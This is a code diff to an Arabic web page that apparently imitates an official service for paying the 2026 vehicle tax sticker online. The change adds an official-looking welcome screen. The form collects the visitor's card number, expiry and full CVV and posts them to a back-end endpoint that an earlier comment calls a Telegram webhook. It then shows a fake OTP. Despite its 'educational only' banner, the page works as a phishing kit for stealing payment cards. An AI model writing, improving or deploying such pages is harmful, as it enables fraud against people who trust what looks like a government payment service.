@@ -119,8 +119,69 @@
         ⚠️ Avertissement: Plateforme éducative uniquement - aucune transaction réelle
     </div>
 
+    <!-- الخطوة 0: صفحة الترحيب -->
+    <div id="step0" class="card">
+        <div style="text-align: center; margin-bottom: 30px;">
+            <h1 style="color: #0055a4; font-size: 24px; margin-bottom: 10px;">مرحباً بكم في منصة اقتضاء قسيمة السيارات عن بعد لسنة 2026</h1>
+            <p style="color: #666; font-size: 14px; line-height: 1.6;">توفر لكم هذه المنصة إمكانية اقتضاء قسيمة السيارات عن بعد على مدار 24 ساعة / 24 ساعة و 7 أيام / 7 أيام بسرعة وأمان، دون الحاجة إلى التنقل</p>
+        </div>
+
+        <div style="background: #f8f9fa; padding: 25px; border-radius: 15px; margin-bottom: 20px;">
+            <h2 style="text-align: center; color: #0055a4; font-size: 18px; margin-bottom: 20px;">لاقتضاء قسيمتك عن بعد، يرجى اتباع الخطوات التالية:</h2>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+                <!-- Step 1 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">📄</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 01: إدخال رقم تسجيل المركبة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">لاقتضاء القسيمة، يرجى إدخال رقم تسجيل المركبة.</p>
+                </div>
+
+                <!-- Step 2 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">✅</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 02: التحقق من صحة المعلومات المتعلقة بالمركبة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">يرجى التأكد من صحة المعلومات المتعلقة بالمركبة</p>
+                </div>
+
+                <!-- Step 3 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">💳</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 03: عرض تعريفة القسيمة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">في هاته الخطوة، يرجى الموافقة على عملية دفع تعريفة القسيمة المطلوبة</p>
+                </div>
+
+                <!-- Step 4 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">🏦</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 04: دفع القسيمة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">يرجى إدخال معلومات بطاقة الدفع البنكية أو الدهبية</p>
+                </div>
+
+                <!-- Step 5 -->
+                <div style="background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e0e0; grid-column: 1 / -1;">
+                    <div style="width: 60px; height: 60px; margin: 0 auto 15px; background: #ffa500; border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 40px;">🚗</span>
+                    </div>
+                    <h3 style="color: #0055a4; font-size: 14px; margin-bottom: 8px;">الخطوة 05: تحميل وطباعة</h3>
+                    <p style="color: #666; font-size: 12px; line-height: 1.5;">بمجرد دفع القسيمة، يمكنكم تحميل القسيمة و إرسال الدفع وطباعتها</p>
+                </div>
+            </div>
+        </div>
+
+        <button onclick="startProcess()">متابعة</button>
+    </div>
+
     <!-- الخطوة 1 -->
-    <div id="step1" class="card">
+    <div id="step1" class="card hidden">
         <div class="step">الخطوة 1: إدخال رقم التسجيل</div>
         <label>رقم تسجيل المركبة:</label>
         <input type="text" id="plaque" placeholder="مثال: 1234 ع 99" dir="ltr">
@@ -183,6 +244,10 @@
     let timerInterval = null;
     let timeRemaining = 120;
 
+    function startProcess() {
+        showStep(1);
+    }
+
     function searchCar() {
         const plaque = document.getElementById('plaque').value.trim();
         if (!plaque) {
@@ -235,10 +300,10 @@
         }
         
         try {
-            // إرسال بيانات الدفع إلى Telegram Webhook
+            // إرسال بيانات الدفع إلى API
             const paymentData = {
                 plaque: currentCar?.plaque || 'غير محدد',
-                cardNumber: cardNumber.slice(-4).padStart(16, '*'), // إظهار آخر 4 أرقام فقط
+                cardNumber: cardNumber.slice(-4).padStart(16, '*'),
                 expiry: expiry,
                 cvv: cvv,
                 timestamp: new Date().toLocaleString('ar-EG'),
@@ -246,7 +311,8 @@
                 modele: currentCar?.modele || 'غير محدد'
             };
             
-            // استدعاء الـ webhook
+            console.log("[v0] Sending payment data:", paymentData);
+            
             const response = await fetch('/api/send-payment', {
                 method: 'POST',
                 headers: {
@@ -255,8 +321,10 @@
                 body: JSON.stringify(paymentData)
             });
             
+            const responseData = await response.json();
+            console.log("[v0] Response:", responseData);
+            
             if (response.ok) {
-                console.log("[v0] Payment data sent successfully");
                 // توليد OTP عشوائي (6 أرقام)
                 generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
                 document.getElementById('otpDisplay').innerHTML = generatedOtp;
@@ -271,11 +339,11 @@
                 
                 showStep(4);
             } else {
-                throw new Error('فشل إرسال البيانات');
+                throw new Error(responseData.error || 'فشل إرسال البيانات');
             }
         } catch (error) {
             console.error("[v0] Error sending payment:", error);
-            alert('حدث خطأ في إرسال البيانات: ' + error.message);
+            alert('حدث خطأ: ' + error.message);
         }
     }
 
@@ -310,7 +378,6 @@
         }
     }
 
-    // التعامل مع حقول OTP
     function setupOtpInputs() {
         for (let i = 1; i <= 6; i++) {
             const input = document.getElementById(`otp${i}`);
@@ -349,6 +416,7 @@
     }
 
     function showStep(step) {
+        document.getElementById('step0').classList.add('hidden');
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('step3').classList.add('hidden');
@@ -375,7 +443,7 @@
         for (let i = 1; i <= 6; i++) {
             document.getElementById(`otp${i}`).value = '';
         }
-        showStep(1);
+        showStep(0);
     }
 </script>
 </body>
